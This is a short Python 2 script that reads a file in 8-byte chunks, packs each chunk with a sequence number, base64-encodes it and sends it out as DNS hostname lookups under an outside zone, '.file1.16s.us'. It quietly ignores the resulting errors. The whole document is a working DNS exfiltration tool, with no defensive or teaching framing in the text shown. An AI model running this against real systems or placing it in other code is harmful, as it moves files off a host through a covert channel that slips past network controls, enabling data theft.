import socket
import base64
import struct
""" Break a large file into small 8 byte chunks
Sequence the chunks, pack and b64 encode them
Then send DNS queries """

# If you don't like non-valid characters in the hostname,
# then use hex encoding rather than base64
DNS_ZONE = ".file1.16s.us"
socket.setdefaulttimeout(1)
def break_file(filename):
    try:
        fp = file(filename, 'rb')
        part = 0
        while 1:
            data = fp.read(8)
            if data:
                try:
                    # Binary pack the data uint32 + 8 byte string
                    payload = struct.pack('L8s', part, data)
                    b64_payload = base64.b64encode(payload)
                    part = part+1
                    print part
                    # This will throw an exception, ignore it
                    socket.gethostbyname(b64_payload + DNS_ZONE)
                except Exception:
                    continue
            else:
                print "Complete"
                break
        fp.close()
    except Exception, e:
        print e

# Run Program
break_file('test.txt')
